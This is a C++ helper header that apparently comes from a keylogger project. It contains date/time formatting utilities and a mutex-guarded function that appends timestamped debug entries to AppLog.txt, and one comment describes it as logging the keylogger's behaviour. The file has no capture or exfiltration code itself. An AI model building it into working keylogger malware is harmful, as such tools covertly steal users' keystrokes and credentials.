#ifndef HELPER_H
#define HELPER_H
#include<ctime>
#include<string>
#include<sstream>
#include<fstream>
#include<mutex>
HANDLE ghMutex;
std::mutex fmtx;
namespace Helper {
    template <class T> std::string ToString(const T&); // This function will convert any type to String

    struct DateTime {
        DateTime() {// This constructor will return Current Date Time of the system
            time_t ms; // time_t is data type in ctime
            time(&ms);
            struct tm* info = localtime(&ms); // This inbuilt function will return address of tm type to get local system date time info
            D = info->tm_mday;
            m = info->tm_mon + 1;// +1 because months are stated from zero in tm struct
            y = 1900 + info->tm_year;// time starts from 1970 in UNIX
            H = info->tm_hour;
            M = info->tm_min;
            S = info->tm_sec;
        }
        DateTime(int D, int m, int y, int H, int M, int S) :D(D), m(m), y(y), H(H), M(M), S(S) {}
        DateTime(int D, int m, int y) :D(D), m(m), y(y), H(0), M(0), S(0) {}
        DateTime Now() const {
            return DateTime();
        }
        int D, m, y, M, H, S;

        std::string GetDateString() const {
            return std::string(D < 10 ? "0" : "") + ToString(D) + std::string(m < 10 ? ".0" : ".") + ToString(m) + "." + ToString(y);
            // date is 9/8/1990 we are returning 09.08.1990
            // date is 11/12/1990 we are returning 11.12.1990
        }

        std::string GetTimeString(const std::string& sep = ":") const {// sep means separator..default separator is colon here ":"
            return std::string(H < 10 ? "0" : "") + ToString(H) + sep + std::string(M < 10 ? "0" : "") + ToString(M) + sep + std::string(S < 10 ? "0" : "") + ToString(S);
            // returning time in HH:MM:SS;
        }
        std::string GetDateTimeString(const std::string& sep = ":") const {
            return GetDateString() + " " + GetTimeString(sep);
        }
    };

    template <class T> std::string ToString(const T& e) {
        std::ostringstream s; //output string stream
        s << e;
        //As this function is Generic, But we can only and only able to pass the types to this function which supports insertion operator (<<). Otherwise this will give Compilation error
        return s.str();
    }
    void WriteAppLogToFile(const std::string& s) {
        DWORD dwCount = 0, dwWaitResult;
        dwWaitResult = WaitForSingleObject(
            ghMutex,    // handle to mutex
            INFINITE);  // no time-out interval

        std::ofstream file("AppLog.txt", std::ios::app);
        file << "{ " << Helper::DateTime().GetDateTimeString() << " }" << "\n" << s << std::endl << "\n";
        file.close();
        ReleaseMutex(ghMutex);
    }
    void WriteAppLog(const std::string& s) {// This function will store logs (behavior) of keylogger so that if it fails somewhere we will be able to debug it.
        fmtx.lock();
        WriteAppLogToFile(s);
        fmtx.unlock();
    }

}
#endif // HELPER_H
